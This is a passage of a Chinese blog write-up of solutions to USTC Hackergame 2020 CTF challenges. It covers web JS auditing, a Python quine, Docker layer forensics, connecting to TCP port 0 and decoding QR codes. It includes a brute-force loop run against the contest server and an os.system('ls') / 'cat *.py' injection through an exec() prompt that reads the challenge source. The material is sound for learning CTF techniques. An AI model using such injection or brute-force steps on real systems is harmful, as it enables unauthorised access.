resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/4.png\" width=\"680\" height=\"888\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/5.png\" width=\"1862\" height=\"712\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>...... <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>......</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/21.png\" width=\"1423\" height=\"781\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/22.png\" width=\"800\" height=\"440\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/23.png\" width=\"800\" height=\"440\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/24.png\" width=\"1067\" height=\"586\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>......</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.5/26.png\" width=\"919\" height=\"936\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>......</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>......</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>\"Send from Arctic.\" 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊......话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>......</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There's no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/20.png\" width=\"829\" height=\"601\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 